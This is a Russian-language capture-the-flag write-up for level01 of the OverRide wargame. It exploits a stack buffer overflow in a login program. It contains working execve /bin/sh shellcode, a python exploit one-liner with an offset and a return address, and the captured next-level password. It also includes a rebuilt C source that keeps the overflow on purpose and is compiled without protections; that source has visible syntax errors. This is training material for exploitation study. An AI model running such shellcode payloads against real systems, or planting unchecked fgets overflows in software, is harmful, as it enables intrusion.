# LEVEL 01

## Команды и ресурсы
gdb

## Уязвимость
buffer overflow

## Решение
1. Попробуем запустить программу
```bash
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: ttt
verifying username....

nope, incorrect username...

```
Программа ждет корректный username, выходит в случае неверного ввода

2. Посмотрим в отладчике (файлы с дизассемблированным кодом [тут](resources/disas.md))
В функции мейн происходит вызов функций verify_user_name  и  verify_user_pass
логин сравнивается с "dat_wil", пароль сравнивается с "admin". Однако даже при правильных логине и 
пароле программа завершает работу


3. Checksec показывает, что NX защита отключена, значит теоретически мы можем внедрить шелл-код

Программа дважды использует fgets для ввода сначала имени пользователя (сохраняется в глобальную переменную достаточного размера, переполнения буфера не вызывается),
затем для ввода пароля. Вот тут fgets считывает 100 символов, а буфер, куда мы сохраняем введенное значение занимает всего лишь 64 байта. 

4. Определим оффсет с помощью [онлайн утилиты](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```bash
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```
Offset равен 80.

5. Теперь сгенерируем шелл-код [shell-storm](https://shell-storm.org/shellcode/files/shellcode-517.php) 21 байт

```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```
```c
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

6. Сгенерируем итоговую строку для взлома:

- 'dat_wil\n' + 23 байт шелл-кода + 80-23=57 символов до оффсета + адрес шелл-кода (второго fgtes)
- определим адрес fgets - 0xffffd6ec
```bash
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
) = 39
printf("Enter Username: ")                 = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)        = 0x0804a040
puts("verifying username....\n"verifying username....

)           = 24
puts("Enter Password: "Enter Password: 
)                   = 17
fgets(admin
"admin\n", 100, 0xf7fcfac0)          = 0xffffd6ec
puts("nope, incorrect password...\n"nope, incorrect password...

)      = 29

```

- составим итоговую строку:

(python -c "print('dat_wil\n' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 57 + '\x5c\xd6\xff\xff')"; cat) | ./level01

```bash
level01@OverRide:~$ (python -c "print('dat_wil\n' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 57 + '\xdc\xd6\xff\xff')"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```


## Воссоздадим бинарный файл
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char a_user_name[256];

int verify_user_name() {
    puts("verifying username....\n");
    return strncmp(a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *buffer) {
    return strncmp(buffer, "admin", 5)
}

int main(void)
{
    char buffer[64];
    int check;          // 0x5c

    memset(buffer, 0, 64);

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);

    check = verify_user_name();
    if (ret) {
        puts("nope, incorrect username...\n");
        return 1;
    }

    puts("Enter Password: ");
    fgets(buffer, 100, stdin);
    check = verify_user_pass(buffer);
    if (check != 0) {
        if (check != 0) {
            puts("nope, incorrect password...\n");
            return 1;
        }
    }
    return 0;
}
```

## Переносим на виртуальную машину, компилируем, проверяем
1. Копируем на виртуальную машину
``` bash
 scp -P 4242 ~/42/override/level01/source.c level01@192.168.56.129:/tmp/source_level01.c
 ```

2. заходим под level02 на виртуальную машину
```bash
su level02
```

3. Компилируем

```bash
cd /tmp
gcc -fno-stack-protector -z norelro -z execstack -m32 source_level01.c -o level01
```
```bash
level02@OverRide:/tmp$ checksec --file level01
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01

```

4. Меняем права
```bash
level02@OverRide:/tmp$ chmod u+s level01; chmod +wx level01; chmod +s level01;

```
5. Возвращаемся в юзера bonus0 и Запускаем
```bash
level02@OverRide:/tmp$ exit


```
6. Проверяем уязвимость
```bash
level01@OverRide:~$ (python -c "print('dat_wil\n' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 57 + '\xec\xd6\xff\xff')"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv


```
